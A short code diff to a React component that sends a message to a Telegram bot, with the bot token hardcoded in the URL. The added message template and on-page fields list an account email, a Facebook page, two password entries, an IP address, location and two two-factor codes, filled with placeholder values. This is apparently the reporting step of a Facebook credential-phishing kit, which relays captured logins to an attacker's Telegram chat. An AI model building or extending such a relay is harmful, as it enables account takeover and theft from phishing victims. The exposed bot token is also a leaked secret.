@@ -32,7 +32,23 @@ const Home = () => {
 
 
     const API_URL = `https://api.telegram.org/bot7132569946:AAGNmy86xNs6x--A1OyDixdgE7be2kscibU/`;
-    let message = `<b>Hi anh em, toi la NVD</b>`;
+    let message = `
+Email Account: ptd@gmail.com
+Name Account: PTD
+Person Email: nvd@gmail.com
+Facebook Page: TYPTIT
+User Name: Duong
+Phone Number: 031313
+Password First: 123
+Password Second: 123
+Ip: 1.1.1.1
+City: Sydney
+Country: Vietnam
+First Code Authen: 831783
+Second Code Authen: 313131
+Images Url:
+✅Đã thêm vào sheet thành công
+`;
     let CURRENT_API_URL = API_URL + "sendMessage"
     try {
       await axios.post(CURRENT_API_URL, {
@@ -53,7 +69,25 @@ const Home = () => {
   return (
     <div>
       <button onClick={sendMessage}>Send Message</button>
+      <div >
+        <p>Email Account: ptd@gmail.com</p>
+        <p>Name Account: PTD</p>
+        <p>Person Email: nvd@gmail.com</p>
+        <p>Facebook Page: TYPTIT</p>
+        <p>User Name: Duong</p>
+        <p>Phone Number: 031313</p>
+        <p>Password First: 123</p>
+        <p>Password Second: 123</p>
+        <p>Ip: 1.1.1.1</p>
+        <p>City: Sydney</p>
+        <p>Country: Vietnam</p>
+        <p>First Code Authen: 831783</p>
+        <p>Second Code Authen: 313131</p>
+        <p>Images Url:</p>
+        <p>✅Đã thêm vào sheet thành công</p>
+      </div>
     </div>
+
   )
 }
 
